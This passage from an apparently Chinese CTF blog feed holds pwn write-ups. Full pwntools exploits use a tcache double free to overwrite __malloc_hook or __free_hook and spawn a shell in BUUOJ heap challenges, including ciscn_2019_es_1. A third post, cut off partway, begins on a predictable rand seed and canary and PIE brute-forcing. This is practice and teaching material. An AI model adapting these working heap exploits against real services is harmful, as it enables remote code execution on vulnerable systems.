title="完整EXP"></a>完整EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25726</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input the index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input the size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;now you can write something&quot;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;gift :&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input the index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 具有tcache,用overlap，可以修改size&gt;0x408再次free既可进入</span></span><br><span class="line"><span class="comment"># unsorted bin 然后输出泄漏libc</span></span><br><span class="line"><span class="comment"># 查询wp，发现用double free</span></span><br><span class="line">onegadget = <span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x400 = 8*0x80</span></span><br><span class="line">heap = add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># 此时 tcache 5 &gt; 5</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)) <span class="comment"># 修改size为0x421</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># unsorted bin 此时chunk0_addr -&gt; main_arena+96</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># tcache</span></span><br><span class="line">test = add(<span class="number">13</span>,<span class="number">0x78</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># 切割unsorted bin</span></span><br><span class="line">success(<span class="string">&quot;test : &quot;</span>+<span class="built_in">hex</span>(test))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># tcache</span></span><br><span class="line">main_arena = add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) - <span class="number">96</span></span><br><span class="line">success(<span class="string">&quot;main_arena : &quot;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget += base</span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x78</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># 调用onegadget</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初遇tcache-double_free</title>
      <link href="/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/"/>
      <url>/2024/09/22/%E5%88%9D%E9%81%87tcache-double-free/</url>
      
        <content type="html"><![CDATA[<h1 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h1><p><a class="link" href="https://buuoj.cn/challenges#ciscn_2019_es_1">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><font size="4" color="red">要点：</font></p><ul><li>虽然说tcache的double free漏洞在glibc2.30之后才完备，但是glibc2.27中也有版本具备该检测</li><li>我最开始用的2.27-3ubuntu1.5_amd64就是不可以的，但是此题目是没有该检查的，本地测试可以用2.27-3ubuntu1_amd64</li></ul><h1 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h1><ul><li><strong>经典的堆菜单，但是glibc2.27具有tcache</strong></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hate 2.29 , can you understand me?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;maybe you know the new libc&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(); <span class="comment">// 菜单</span></span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        call(); <span class="comment">// free</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Jack Ma doesn&#x27;t like you~&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类似形成一个结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Chunk</span>&#123;</span></span><br><span class="line">    Chunk* chunk;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202526933.bmp"></p><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202709261.bmp"></p><h2 id="call-free"><a href="#call-free" class="headerlink" title="call(free)"></a>call(free)</h2><ul><li><strong>很明显的uaf漏洞</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922202720899.bmp"></p><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><ul><li>漏洞点很明显，有uaf漏洞，free掉的指针没有清零</li><li>先malloc(0x410) 绕过tcache进入unsorted bin，然后直接show就可以泄露libc，也可以malloc(0x80)，然后free8次，再show也是可以的，是因为此题目没有double free检查</li><li>然后double free改free_hook为system，就差不多了，跟之前一样的步骤</li></ul><h1 id="gdb动调"><a href="#gdb动调" class="headerlink" title="gdb动调"></a>gdb动调</h1><h2 id="绕过tcache-泄露libc"><a href="#绕过tcache-泄露libc" class="headerlink" title="绕过tcache+泄露libc"></a>绕过tcache+泄露libc</h2><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)<span class="comment"># 绕过tcache进入unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的泄漏libc</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook : &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br></pre></td></tr></table></figure></div><ul><li>先malloc(0x410)（＞0x408）绕过tcache，后面两个malloc是为了修改free_hook和最后的getshell</li><li>free(chunk0)之后,如下，此时fd和bk指向的是<strong>main_arena+96，而不是88了</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922205929434.bmp"></p><ul><li>由于此时的指针没有清零，可以直接show，泄露libc</li></ul><h2 id="double-free-getshell"><a href="#double-free-getshell" class="headerlink" title="double free+getshell"></a>double free+getshell</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># glibc2.30才有的double free的检查</span><br><span class="line">free(1)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line"># 此时 tcache bin 中 1 -&gt; 1</span><br><span class="line">add(0x20,p64(free_hook),b&#x27;1&#x27;)</span><br><span class="line">add(0x20,b&#x27;bbbb&#x27;,b&#x27;1&#x27;)</span><br><span class="line">add(0x20,p64(system),b&#x27;4&#x27;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><ul><li>double free之后：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922210438537.bmp"></p><ul><li><font color="red">第一次add:</font></li></ul><p>修改了tcache bin中chunk的fd指针，指向__free_hook,只需要两次malloc就可以malloc到free_hook,进行修改</p><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922211627712.bmp"></p><ul><li><font color="red">第二次add(无用的chunk):</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922211649330.bmp"></p><ul><li><font color="red">第三次add:</font></li></ul><p>可以看到__free_hook指向了system，调用free-&gt;free_hook-&gt;system</p><p><img lazyload src="/images/loading.svg" data-src="/%E5%88%9D%E9%81%87tcache-double-free/capture_20240922212154845.bmp"></p><ul><li>最后直接free(2)即可，相当于system(“&#x2F;bin&#x2F;sh”)</li></ul><h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,26786)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct Chunk&#123;</span></span><br><span class="line"><span class="string">    Chunk* chunk;</span></span><br><span class="line"><span class="string">    int size;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,call</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the size of compary&#x27;s name\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input name:\n&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;please input compary call:\n&quot;</span>,call)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)<span class="comment"># 绕过tcache进入unsortedbin</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单的泄漏libc</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name:\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;malloc_hook : &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line">base = malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># glibc2.30才有的double free的检查</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache bin 中 1 -&gt; 1</span></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪随机+爆破canary+爆破PIE</title>
      <link href="/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/"/>
      <url>/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/</url>
      
        <content type="html"><![CDATA[<h1 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><font color="red">题目来自：basectf</font></p><p><font color="red">题解参考：<a class="link" href="https://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh">官方wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></font></p><h1 id="checksec-ida速览"><a href="#checksec-ida速览" class="headerlink" title="checksec+ida速览"></a>checksec+ida速览</h1><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">Arch:       amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        PIE enabled</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br><span class="line">Stripped:   No</span><br><span class="line"><span class="comment">// 保护全开，注意PIE</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/capture_20240921150140743.bmp"></p><ul><li><p>第一个红框，伪随机数的绕过，只要libc一致，时间一致，算法一致，所产生的随机数也是一样的。</p></li><li><p>第二个红框fork创建子进程，虽然创建子进程是从头开始，但是canary是不变的，这里可以爆破canary</p></li><li><p>第三个红框是核心函数，可以用来爆破canary和栈溢出到shell函数。</p></li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/capture_20240921150603492.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/capture_20240921150659629.bmp"></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul><li>第一步肯定是绕过伪随机数，这里用到python中的ctypes库，先用本地的libc演示：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) <span class="comment"># 本地libc</span></span><br><span class="line">seed = libc.time(<span class="number">0</span>) <span class="comment"># 时间种子，0代表本地时间</span></span><br><span class="line">libc.srand(seed) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = libc.rand() % <span class="number">50</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">srand 搭配 rand</span></span><br><span class="line"><span class="string">srandom 搭配 random</span></span><br><span class="line"><span class="string">前者安全性差</span></span><br><span class="line"><span 